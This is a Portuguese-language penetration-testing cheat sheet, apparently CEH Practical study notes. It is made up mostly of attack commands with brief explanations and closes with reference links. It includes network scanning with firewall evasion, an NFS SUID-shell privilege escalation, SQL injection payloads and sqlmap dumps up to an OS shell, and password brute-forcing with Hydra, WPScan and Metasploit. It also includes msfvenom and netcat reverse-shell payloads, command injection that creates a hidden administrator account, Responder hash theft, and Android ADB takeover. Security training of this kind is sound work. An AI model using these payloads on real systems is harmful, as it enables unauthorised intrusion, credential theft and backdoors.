ip a
traceroute 8.8.8.8
iptables -nL
sudo arp-scan -local
Este comando usa o arp-scan para escanear a rede local em busca de dispositivos conectados.

netdiscover -r IP
Este comando usa o netdiscover para descobrir dispositivos na rede.

nmap -p 53,88,135,139,389,445,464,636,3268,3269 --script smb-os-discovery,smb-enum-shares,ldap-rootdse <alvo>
Este comando escaneia portas adicionais associadas a serviços de domínio e utiliza scripts para enumerar informações do sistema operacional e compartilhamentos SMB, além do LDAP.

nslookup <ip_do_controlador_de_dominio>
Após identificar um possível controlador de domínio, use este comando para realizar uma consulta DNS reversa e obter o nome completo do servidor.

nslookup -type=srv _ldap._tcp.dc._msdcs.<nome_do_dominio>
Este comando consulta os registros SRV do DNS para localizar os controladores de domínio do Active Directory. Substitua <nome_do_dominio> pelo nome do domínio identificado nas etapas anteriores.

Windows SMB
smbclient -L [IP]
smbclient \\ip\\sharename
nmap -p 445 -sV –script smb-enum-services [IP]

NFS
Atacante:
mkdir /tmp/pe
show mount -e IP
mount -t nfs <IP>:<pasta> /tmp/pe
cd /tmp/pe
cp /bin/bash
chmod +s bash

Vitima:
cd <pasta>
./bash -p

##NETUSER
Este comando lista todos os usuários do domínio e salva a saída em um arquivo chamado USERS.TXT para análise posterior.
NET USER /DOMAIN > USERS.TXT
Exibir informações de usuários específicos:
NET USER [username] /DOMAIN
Exibe todos os usuários locais da máquina atual.
NET USER
Obter informações de conexão e compartilhamento:
NET USE
Exibir informações de rede:
NET VIEW

##TTL
nmap -sn -PE -n --packet-trace -T4 <rede> | grep "ICMP \|TTL="
-sn: Realiza um ping scan (não escaneia portas, apenas verifica hosts ativos)
-PE: Usa ping ICMP Echo para descoberta de hosts
-n: Não realiza resolução DNS (torna o scan mais rápido)
--packet-trace: Mostra todos os pacotes enviados e recebidos
-T4 aumenta a velocidade do scan, mas pode ser menos precisa em redes congestionadas.
| grep "ICMP \|TTL=": Filtra a saída para mostrar apenas as linhas com ICMP e TTL

Windows: 128
GNU/Linux: 64
Unix e derivados: 255
Solaris/AIX: 254
FreeBSD: 64
HP-UX: 255
Cisco IOS: 255
macOS (OS X): 64
Android: 64
iOS: 64
IBM z/OS: 64
OpenBSD: 64
NetBSD: 64

##NMAP
nmap -sn -PR IP
nmap -sn -PR IP/24 -oN ip.txt
nmap -sn IP/24 -oN nmap.txt
nmap -sn -O IP/24 
nmap -sC -sV -sS -O IP -oN nmap.txt
nmap -sC -sV -v -oN nmap.txt IP
nmap -sC -sS -sV -O IP
nmap -A IP
nmap -A IP/24 -oN nmap.txt
nmap -A -T4 -vv -iL ip.txt -oN nmap.txt 
nmap -sU -sV -A -T4 -v -oN udp.txt 
nmap -sS -sC -sV -O IP -oN nmap.txt
nmap -sV -sC -pA nmap IP
nmap -f IP
nmap -sV -p 80,443,3306,8080 <endereço_ip>
nmap -p 80,443,3306 --script http-title <faixa_de_ip>
nmap -sV --script=http-enum [target domain or IP address] - Encontre qualquer parâmetro de entrada no site e capture a solicitação no burp e, em seguida, use-o para executar a injeção de sql usando sqlmap.
nmap --script smb-os-discovery.nse IP = Displays OS, Computer-Name, Domain, WorkGroup and Ports.
nmap --script http-drupal-enum <alvo>
nmap --script http-drupal-enum-users <alvo>
nmap -p 25 --script smtp-enum-users <endereço_ip_do_servidor>
nmap -p389 -sV IP/24
nmap -p389 –sV -iL <target_list>  
nmap -p 389,636,3268,3269 <faixa_de_ip>
nmap -p 389 --script ldap-rootdse <faixa_de_ip>
nmap -sV -O --osscan-guess <alvo>
-sn: Disable port scan, Detecção de hosts Vivos / Não faz scan em portas
-sN: NULL scan (Não Envia nenhuma Flag)
-PR: ARP ping scan
-PU: UDP ping scan
-PE: ICMP ECHO ping scan
-PP: ICMP timestamp ping scan
-PM: ICMP address mask ping scan
-PS: TCP SYN Ping scan
-PA: TCP ACK Ping scan
-PO: IP Protocol Ping scan
-sT TCP connect/full open scan nível de detecção elevado.
-v: Verbose output
-sS: Stealth scan/TCP hall-open scan, Syn Connect ou half open nível de detecção razoável ao tcp connect.
-sX: Xmax scan
-sM: TCP Maimon scan
-sA: ACK flag probe scan
-sU: UDP scan
-sI: IDLE/IPID Header scan
-sY: SCTP INIT Scan
-sZ: SCTP COOKIE ECHO Scan
-sV Versões de serviços
-Sp: (ex:0.0.0.0/24) - Lista de hosts e total de endereços IP.
-A: Aggressive scan
-O: OS discovery
--script http-title: Usa um script do Nmap para obter o título da página web, o que pode ajudar a identificar o servidor web.
--script smb-os-discovery.nse: -–script: Specify the customized script smb-os-discovery.nse: Determine the OS, computer name, domain, workgroup, and current time over the SMB protocol (Port 445 or 139)
-Pn Não realiza o Ping no Alvo
-D Utiliza endereços falsificados
-sF FIN Scan (Envia flag FIN)
-f Fragmenta pacotes (Burlar firewall)
-O Detecção Sistema Operacional
-A Descobre detalhes sobre os Serviços e Sistema operacional.
-oN Salva o resultado em um arquivo normal
--open Só mostra as portas abertas
--top-ports=30 (retorna saída das portas mais comuns)
-g53 (Porta de origem falsa 53)
–top-ports=10 (portas mais utilizadas)
-iL (lê arquivo de texto para gerar ataque)

Nível de agressividade
Bem lentos
-T0 (prevenção de firewall em geral)
-T1 (15 segundos)
-T2 (4 segundos)
-T3 Padrão Nmap

Bem Agressivos
-T4 (Scan rápido)
-T5 (Scan muito barulhento)

Criar spoofing
nmap -v IP -D IP
-g53 = Porta de origem falsa.
​nmap --open -v -sS -A -T1 -D RND:10 --top-ports=30 -Pn --script=vuln IP

##NETBIOS
No cmd digite: 
nbtstat -a IP (netbios name table)
nbtstat -c IP (list contents of Netbios name cache)

nmap -sV -v --script nbtstat.nse IP
enum4linux -u usuario -p senha IP

##SNMP
nmap -sU -p 161 IP
snmp-check IP = Displays Network Info, Network Interfaces, Network IP, Routing Info, TCP connection and listening, process, Storage info, File System and Device Info.

##DNS
dnsrecon -d www.google.com -z

##FTP
nmap -p 21 -A IP

##RDP
nmap -p 3389 -iL ip.txt | grep open

##SMTP
telnet <endereço_ip_do_servidor> 25
netstat -tuln | grep :25

smtp-user-enum -M <modo> -U <arquivo_usuarios> -t <alvo>
Examplo: smtp-user-enum -M VRFY -U user.txt -t <endereço_ip_do_servidor>

-M: Especifica o método de enumeração (VRFY, EXPN ou RCPT)
-U: Arquivo contendo lista de usernames para testar
-t: Endereço IP ou hostname do alvo
-p: Porta do serviço SMTP (padrão: 25)
VRFY: Verifica se um usuário existe
EXPN: Tenta expandir um alias de e-mail
RCPT: Testa endereços de e-mail válidos
-m: Define o número máximo de processos paralelos
-f: Especifica o endereço de e-mail de origem para o modo RCPT
-D: Adiciona um domínio aos usernames para formar endereços de e-mail

##PORTAS
UDP-based applications and their ports
CharGen UDP Port 19
SNMPv2 UDP Port 161
QOTD UDP Port 17
RPC UDP Port 135
SSDP UDP Port 1900
CLDAP UDP Port 389
TFTP UDP Port 69
NetBIOS UDP Port 137,138,139
NTP UDP Port 123
Quake Network Protocol UDP Port 26000
VoIP UDP Port 5060
Apache (HTTP): Porta 80
8080: Frequentemente usada como alternativa para o Apache quando a porta 80 está em uso ou bloqueada.
Apache (HTTPS): Porta 443
MySQL: Porta 3306
MariaDB: Porta 3306 (se estiver usando MariaDB em vez de MySQL)
PhpMyAdmin: Acessa o MySQL na porta 3306, mas isso pode ser modificado no arquivo de configuração.
389 para LDAP (Lightweight Directory Access Protocol).
636 para LDAPS
3268 para Catálogo Global
3269 para Catálogo Global
Go to IP server and login and go to this pc then right click and go down click on rename this pc advanced.

##ESTENOGRAFIA
Snow
1- Ocultar dados usando estenografia de espaço em branco
snow -C -m "Mensagem" -p "senha" mensagemsecreta.txt mensagemsecreta2.txt
2- Para exibir dados ocultos
snow -C -p "senha" mensagemsecreta2.txt

Openstego - Estenografia de imagem
snow.exe -C -p "senha" mensagemsecreta.txt
-C  compressing / uncompressing
-p  password
Open Stego
GUI tool

QuickStego
Launch QuickStego
Open Image, and select target .jpg file
Open Text, and select a txt file
Hide text, save image file
Re-launch, Open Image
Select stego file
Hidden text shows up

Steghide
apt-get install steghide
steghide embed -ef mensagemoculta.txt -cf imagem.jpeg -sf imagem2.jpeg
steghide extract -sf imagem2.jpeg -xf mensagemdescoberta.txt

##SQL Injection
'
example' or 1=1 #
example' or 1=1 order by 5;
example' or 1=1 union select 1,2,3,4,5 #
example' or 1=1 union select 1,database(),3,4,5 #
example' or 1=1 union select 1,version(),3,4,5 #
example' or 1=1 union select 1,user(),3,4,5 #
example' or 1=1 union select 1,table_name,3,4,5 from information_schema.tables where table_schema='banco' #
example' or 1=1 union select 1,table_name,3,4,5 from information_schema.tables where table_schema=database() #
example' or 1=1 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=database() #
example' or 1=1 union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema=database() #
example' or 1=1 union select 1,username,3,4,5 from 'tabela' #
example' or 1=1 union select 1,username,3,password,5 from 'tabela'
Agora abra o burp e verifique os parâmetros de entrada e intercepte, em seguida, digite alguns como “1 OU QUALQUER TEXTO”
você obtém algum valor no burp, copie e crie o arquivo txt. (1 OR 1=1 #)

#SQLMap
sqlmap -r example.txt -p search --batch --dbs
sqlmap -r example.txt -p search --batch -D 'banco' --tables
sqlmap -r example.txt -p search --batch -D 'banco' -T 'tabela' --columns
sqlmap -r example.txt -p search --batch -D 'banco' -T 'tabela' -C username,password --dump
sqlmap -r example.txt -p search --batch -D 'banco' -T 'tabela' --dump
sqlmap -r example.txt -D 'banco' -T 'tabela' --dump-all

##Navegador
Com o botão direito e inspecione e digite no console “document.cookie” você obterá um valor.
--cookie="campo=valor=;"

Acessar o site alvo
Abra o Firefox e navegue até o site que deseja testar
Dev tools-\&gt;Console: document.cookie
Enumerar bancos de dados
sqlmap -u "http://www.site.aspx?id=1" --cookie="valor_copiado" --dbs
Selecionar um banco de dados e enumerar tabelas
sqlmap -u "http://www.site.aspx?id=1" --cookie="valor_copiado" -D nome_do_banco --tables
Selecionar uma tabela e extrair dados
sqlmap -u "http://www.site.aspx?id=1" --cookie="valor_copiado" -D nome_do_banco -T nome_da_tabela --dump
Tentar obter acesso ao shell do sistema operacional
sqlmap -u "http://www.site.aspx?id=1" --cookie="valor_copiado" --os-shell
Se o shell for obtido, executar comandos (exemplo):
TASKLIST
Use systeminfo para windows para obter todas as versões do sistema operacional
Use uname -a para linux para obter a versão do sistema operacional

##MYSQL
nmap -p 3306 -sV -iL ip.txt | grep open
Este comando escaneia a porta 3306 em todos os hosts listados em ip.txt, detecta a versão do serviço (-sV) e filtra apenas as portas abertas.

Conectar ao banco de dados MySQL:
mysql -u usuario -h <IP> -p

Explorar bancos de dados:
SHOW DATABASES;
USE <banco>;
SHOW TABLES;
SELECT * FROM users;

##BURP SUITE
Brute-force

Configuração inicial:
Configure o proxy do navegador para 127.0.0.1:8080
Inicie o Burp Suite e certifique-se de que o Intercept está ativado
Captura da requisição:
Acesse a página de login do alvo
Insira credenciais aleatórias e envie o formulário
No Burp Suite, localize a requisição de login
Clique com o botão direito na requisição e selecione "Send to Intruder"
Configuração do Intruder:
Vá para a aba "Intruder"
Na sub-aba "Positions":
Clique em "Clear §" para remover marcações existentes
Selecione "Cluster bomb" como tipo de ataque
Marque os campos de usuário e senha com "Add §"
Configuração de payloads:
Na sub-aba "Payloads":
Para "Payload set 1", carregue a lista de usuários
Para "Payload set 2", carregue a lista de senhas
Execução do ataque:
Clique em "Start attack"
Aguarde a conclusão do ataque
Análise dos resultados:
Filtre os resultados por "Status" igual a 302 (redirecionamento bem-sucedido)
Para respostas suspeitas, clique duas vezes para ver os detalhes
Verifique o conteúdo da resposta para confirmar o login bem-sucedido

##XSS
<script>alert("mensagem");</script>

##Rainbowcrack
Iniciar o RainbowCrack
Execute o programa RainbowCrack
Carregar hashes NTLM
Vá em "File" > "Load NTLM Hashes from PWDUMP File"
Selecione o arquivo PWDUMP contendo os hashes
Clique em "Rainbow Table" > "Search Rainbow Table"
Selecione a tabela arco-íris gerada anteriormente
Iniciar o processo de quebra
Clique em "Start" para começar a quebra dos hashes

##OPENVAS
nmap -sV -Pn --script vuln,exploit -p- --open --reason IP
-sV: Realiza detecção de versão de serviços
-Pn: Trata todos os hosts como online, ignorando a descoberta de host
--script vuln,exploit: Executa scripts de detecção de vulnerabilidades e exploração
-p-: Escaneia todas as 65535 portas
--open: Mostra apenas portas abertas
--reason: Exibe o motivo pelo qual uma porta está em um estado específico

##GOBUSTER
Enumeração de Diretórios
gobuster dir -u IP -w wordlist.txt
Este comando utiliza o Gobuster para realizar um ataque de força bruta em diretórios de um site. Especificamente:
"gobuster dir": Inicia o Gobuster no modo de enumeração de diretórios
"-u IP": Especifica o URL ou endereço IP do alvo
"-w wordlist.txt": Define o caminho para a wordlist a ser usada no ataque

##Enumerar um aplicativo da Web usando metasploit
Inicie o Metasploit Framework:
msfconsole
Carregue o módulo de enumeração de login do WordPress:
use auxiliary/scanner/http/wordpress_login_enum
Configure as opções do módulo:
set RHOSTS <ip_alvo>
set RPORT 8080
set TARGETURI http://<ip_alvo>:8080/
set USERNAME <usuario>
set PASS_FILE /caminho/para/wordlist.txt
Verifique as configurações:
show options
Execute o módulo:
run

##OWASP ZAP:
Abra o terminal e digite zaproxy
Realizar um scan automatizado:
Na aba "Quick Start", insira a URL alvo
Clique em "Automated Scan"
Analisar resultados:
Verifique os alertas na aba "Alerts"
Priorize vulnerabilidades de alto risco

##WPSCAN
Enumerar um aplicativo da Web usando WPscan
wpscan --url http://IP:8080/NEW --enumerate u (u significa nome de usuário)
Força bruta usando WPscan - 
wpscan --url http://IP:8080/ -u root -P senha.txt
wpscan --url http://IP:8080/ --usernames userlist.txt, --passwords senha.txt
wpscan --url http://IP:8080/ --enumerate u
wpscan --url http://IP:8080/ -U userlist.txt -P senha.txt
wpscan --url http://IP:8080/ --enumerate u (To enumerate the user)
wpscan –-url http://IP:8080/ -t 50 -U usuario -P rockyou.txt

- wpscan --api-token abcd --url  http://IP:8080/CEH  --plugins-detection aggressive --enumerate u
--enumerate u: Specify the enumeration of users
  - API Token: Register at [https://wpscan.com/register]
  - Mine: abcd
- service postgresql start
- msfconsole
- use auxiliary/scanner/http/wordpress\_login\_enum
- show options
- set PASS\_FILE password.txt
- set RHOST IP
- set RPORT 8080
- set TARGETURI  http://IP:8080/CEH
- set USERNAME admin
- run
- Find the credential

#DIR
Search file in cmd using command: 
dir /b/s “arquivo*” 
Procura por todos os arquivos e diretórios que começam com "“arquivo" no diretório atual e em todos os subdiretórios.
Exibe o caminho completo de cada arquivo ou diretório correspondente.
A opção /b fornece uma listagem em formato simples (sem informações de cabeçalho ou resumo).
A opção /s torna a busca recursiva, incluindo todos os subdiretórios.

##WIRESHARK
ip.addr == 8.8.8.8
ip.src == 8.8.8.8
ip.dst == 8.8.8.8
To find DOS (SYN and ACK): tcp.flags.syn == 1  , tcp.flags.syn == 1 and tcp.flags.ack == 0
tcp.flags.syn == 1 e tcp.flags.ack == 0 (Quantas máquinas) ou Vá para estatísticas Endereços IPv4--> Origem e Destino ---> Então você pode aplicar o filtro fornecido
tcp.flags.syn == 1 (Qual máquina para DOS)
http.request.method == POST (para senhas) ou clique em ferramentas ---> credenciais Também
Agora, para capturar a senha, clique em editar na barra de menu, depois, perto da seção Localizar pacote, em "Filtro de exibição", selecione "string", selecione também "Detalhes do pacote" no menu suspenso "Lista de pacotes", altere também "estreito e largo" para "UTF-8 e ASCII estreito" e digite "pwd" na seção Localizar.

##ANDROID
adb devices
nmap ip/24 -sV -p 5555 (Procurar por porta adb)
adb connect IP:5555 (Conectar adb com parrot)
adb shell (Acessar dispositivo móvel no parrot)
pwd
ls
cd 'diretório'
pwd
adb pull 'diretório': Tenta copiar o diretório e seu conteúdo dpara o diretório atual no computador host.

python3 phonesploit
find / -name diretorio 2>/dev/null
find . -name diretorio 2>/dev/null

ent -h: Programa para realizar testes de entropia em arquivos. (apt install ent)
xxd: Este comando pode ser usado para criar um dump hexadecimal de um arquivo, o que pode ajudar na análise visual da distribuição de bytes.
od: O comando "octal dump" pode ser usado com várias opções para exibir o conteúdo do arquivo em diferentes formatos, incluindo hexadecimal.
hexdump: Similar ao xxd, este comando cria um dump hexadecimal que pode ser útil para análise visual.
sha256sum ou sha384sum e outros comandos de hash: Embora não calculem diretamente a entropia, os hashes podem dar uma ideia da aleatoriedade dos dados.
dmesg: Pode ser usado para verificar mensagens do kernel relacionadas à geração de entropia do sistema.
cat /proc/sys/kernel/random/entropy_avail: Este comando mostra a quantidade de entropia disponível no pool do kernel Linux.
readelf -h <executável> | grep "palavra"
readelf -l <executável> | grep "palavra"
dumpbin /headers arquivo.exe
Utilizando o PEview (ferramenta gratuita de terceiros):
Abra o executável no PEview
Navegue até a seção "NT Headers" > "Optional Header"
No PEview, verifique as seções ".text", ".data" e ".rdata"
DIE
echo -n 123456 | hexdump -c > hash
john --format=raw-MD5 hash

#SSH
Lembre-se que o ssh não consegue processar mais de 4 senhas ao mesmo tempo
Crie ou utilize um dicionário
hydra -v -V -l usuário -P dicionario.txt -t 4 ssh://IP

##WIRELESS
aircrack-ng 'arquivo.cap'
aircrack-ng 'arquivo.cap' -w 'arquivo.txt'
aircrack-ng -b 'macaddress' -w 'arquivo.txt' 'arquivo.cap'
aircrack-ng [arquivo pcap] (Para quebrar a rede WEP)
aircrack-ng -a2 -b [BSSID de destino] -w [wordlist.txt] [arquivo WP2 PCAP] (Para quebrar WPA2 ou outras redes através do arquivo .pcap capturado)

##FTP
1. Nmap -p 21 IP/24
2. Sudo nmap -sS -A -T4 ip/24
3. hydra -L usuario.txt -P senha.txt ftp://IP
4. ftp IP and type user name and password login
5. Ls and search for the arquivo.txt file using find . -name arquivo.txt.

##HASHCAT
Hashcat -a 3 -m 0 hash.txt /rockyou.txt
-a attack mode
-m hashtype
-a 3: Define o modo de ataque como bruteforce/máscara, que tenta todas as combinações possíveis de caracteres.
hash.txt: Arquivo contendo os hashes a serem quebrados.
/rockyou.txt: Wordlist (lista de senhas) a ser utilizada no ataque.
-m 0: Especifica o tipo de hash
900: MD4
1000: NTLM
1800: SHA512CRYPT
110: SHA1 com SALT
0: MD5
100: SHA1
1400: SHA256
3200: BCRYPT
160: HMAC-SHA1

##Hydra
FTP: hydra -l user -P passlist.txt [ftp://IP]
hydra -L userlist.txt -P passlist.txt [ftp://IP]
SSH: hydra -l <username> -P <full path to pass> IP -t 4 ssh
Post Web Form: hydra -l <username> -P <wordlist> IP http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
hydra -L /root/Desktop/Wordlists/Usernames.txt -P /root/Desktop/Wordlists/Passwords.txt ftp://[IP]'
hydra -l root -P passwords.txt [-t 32] <IP> ftp
hydra -L usernames.txt -P pass.txt <IP> mysql
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V'
hydra -V -f -L <userslist> -P <passwlist> *rdp*://<IP>'
hydra -P common-snmp-community-strings.txt target.com snmp
hydra -l Administrator -P words.txt IP smb t 1
hydra -l root -P passwords.txt <IP> ssh

nmap -p 21 [IP]
hydra -L usernames.txt -P passwords.txt ftp://IP
hydra -l user -P passlist.txt ftp://IP

Explore uma vulnerabilidade web
telnet IP 80 
GET / HTTP/1.0 
hydra -L user.txt -P pass.txt IP telnet 
telnet IP 
hydra -L user.txt -P pass.txt IP ssh  
ssh ubuntu@IP

##john - Offline Attacks
Quebrar o hash adquirido
john SMB-NTLMv2-SSP-IP.txt --wordlist /usr/share/wordlists/rockyou.txt
john --format=NT arquivo.txt --wordlist /usr/share/wordlists/rockyou.txt
john marquivo.txt --show
john --format=LM arquivo.txt --show
john arquivo.txt (Comando modo bruteforce = Sem dicionário)

First analyze hash type - 'john hashfile.hash'
Then crack hash - 'john hashfile.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA1'
Show the cracked password - 'john --show --format=Raw-SHA1 hashfile.hash' OR 'john --show hashfile.hash

1- Footprinting web server usando Netcat e Telnet- nc -vv www.site.com 80
GET /HTTP/1.0
telnet www.site.com 80
GET /HTTP/1.0
Enumerar informações do servidor Web usando nmap: nmap -sV --script=http-enum www.site.com

Primeira coisa - Ligar wireshark
http://www.www.site.com/index.aspx
Logar com o acesso concedido
Clique em View Profile
Perceba que é possível editar a URL: id=1 
Ou seja, você vai fazer adulteração do parametro do método get.
O nome dessa técnica é idor.

##METASPLOIT
msfconsole
msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1  LPORT=4444 -f raw >exploit.php 
use exploit/multi/handler or use 30 
set payload php/meterpreter/reverse_tcp 
Set LHOST ipadd 
Carregue um arquivo que você criou como exploit.php
Abra o terminal e digite run assim que obtiver a url digite url no navegador você obtém a sessão do meterpreter então digite ls obtenha os arquivos.

Força bruta de login com Metasploit:
msfconsole
use auxiliary/scanner/http/wordpress_login_enum
set PASS_FILE /path/to/wordlist.txt
set RHOSTS <target_ip>
set RPORT 8080
set TARGETURI http://<target_ip>:8080/
set USERNAME admin
run

##DVWA
Set the Security Level "Low"
Click on the Command Injection Tab 
Check the parameter is vulnerable or not and it is vulnerable 
Now enter the system cmd's
| hostname
| whoami
| dir C:\path.txt
| type path.txt
| tasklist| Taskkill /PID /F
| dir C:\
| net user
| net user user001 /Add
| net user user001
| net localgroup Administrators user001 /Add
- Use created account user001 to log in remotely
- /PID: Process ID value od the process
- /F: Forcefully terminate the process

Disable Windows Functionality
fsutil = DisableLastAccess

##RESPONDER
- Linux
cd Responder
chmox +x ./Responder.py
sudo ./Responder.py -I eth0
passwd: \*\*\*\*

- Windows
run
\\PastaQualquer

- Linux
cd /usr/share/responder/logs
Home/Responder/logs/SMB-NTMLv2-SSP-[IP].txt

sudo snap install john-the-ripper
passwd: \*\*\*\*
sudo john /home/ubuntu/Responder/logs/SMB-NTLMv2-SSP-IP.txt

##FIND
groups
grep 'sudo' /etc/group
sudo ls
sudo -i
cd /
find . -name file.txt
cat file.txt

python -c 'import pty:pty.spawn("/bin/bash");'
nc -vnlp 80
ls /usr/share/webshells/php

Gere o payload usando o comando msfvenom: msfvenom -p cmd/unix/reverse_netcat LHOST=ip LPORT=444
Copie a saída gerada pelo comando acima.
Faça login na máquina de destino via SSH ou Telnet.
Cole o payload copiado diretamente no terminal da máquina de destino.
Pressione Enter para executar o payload.
Na sua máquina local, inicie um listener netcat na porta especificada: nc -lnvp 444
ls
find . -name arquivo.txt
cat arquivo.txt

#Consultas externas
http://lab.awh.zdresearch.com/ = sqlmap -u http://lab.awh.zdresearch.com/chapter2/xvwa/vulnerabilities/sqli/ --data='item=&search=1' --batch -D xvwa -T users --dump
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/
https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html  (SMB Checklist Enumeration)
https://zhuanlan.zhihu.com/p/124246499
https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
https://n00bie.medium.com/hacking-android-using-phonesploit-ffbb2a899e6
https://www.comparitech.com/net-admin/wireshark-cheat-sheet/
https://www.hackers-arise.com/post/2018/09/27/network-forensics-part-2-detecting-and-analyzing-a-scada-dos-attack
https://hashes.com/en/decrypt/hash
https://nvd.nist.gov/vuln-metrics/cvss#
https://intezer.com/blog/malware-analysis/elf-malware-analysis-101-initial-analysis/
https://xz.aliyun.com/t/4008

Dirb (Web content scanner)
https://medium.com/tech-zoom/dirb-a-web-content-scanner-bc9cba624c86
https://blog.csdn.net/weixin\_44912169/article/details/105655195

Searchsploit (Exploit-DB)
https://www.hackingarticles.in/comprehensive-guide-on-searchsploit/

Crunch (wordlist generator)
https://www.cnblogs.com/wpjamer/p/9913380.html

Cewl (URL spider)
https://www.freebuf.com/articles/network/190128.html

HASH
https://www.onlinehashcrack.com/hash-identification.php
https://crackstation.net/
https://hashes.com/en/decrypt/hash
https://tools.kali.org/password-attacks/hashcat

https://tryhackme.com/room/rpnmap
https://tryhackme.com/room/networkservices
https://tryhackme.com/room/toolsrus
https://tryhackme.com/room/webappsec101
https://tryhackme.com/room/dailybugle
https://tryhackme.com/room/hydra
https://tryhackme.com/room/crackthehash
https://tryhackme.com/r/room/linprivesc

https://www.youtube.com/watch?v=DtWjUsbuMtk&list=PLZEA2EJpqSWfouVNPkl37AWEVCj6A2mdz&index=6 - Playlist Youtube - CEH Practical
https://www.youtube.com/playlist?list=PLWGnVet-gN_kGHSHbWbeI0gtfYx3PnDZO
https://adithyanak.gitbook.io/ceh-practical/
https://chirag-singla.notion.site/CEH-Practical-Preparation-7f2b77651cd144e8872f2f5a30155052
https://book.thegurusec.com/certifications/certified-ethical-hacker-practical/steganography
https://medium.com/@jonaldallan/passed-ec-councils-certified-ethical-hacker-practical-20634b6f0f2
https://www.linkedin.com/pulse/my-jouney-ceh-practical-joas-antonio-dos-santos
https://book.thegurusec.com/certifications/certified-ethical-hacker-practical/steganography
https://nx7.me/posts/cehreview/
https://github.com/Samsar4/Ethical-Hacking-Labs
https://github.com/dhabaleshwar/CEHPractical/
https://github.com/cmuppin/CEH
https://github.com/CyberSecurityUP/Guide-CEH-Practical-Master
https://github.com/Samson-DVS/CEH-Practical-Notes  (Very-useful)
https://github.com/nirangadh/ceh-practical         (Very-useful)
https://github.com/CyberSecurityUP/Guide-CEH-Practical-Master
https://github.com/Samsar4/Ethical-Hacking-Labs
https://github.com/Rezkmike/CEH_Practical_Preparation (very-useful tools)
https://github.com/System-CTL/CEH_CHEAT_SHEET
https://github.com/hunterxxx/CEH-v12-Practical
https://github.com/CyberSecurityUP/Guide-CEH-Practical-Master
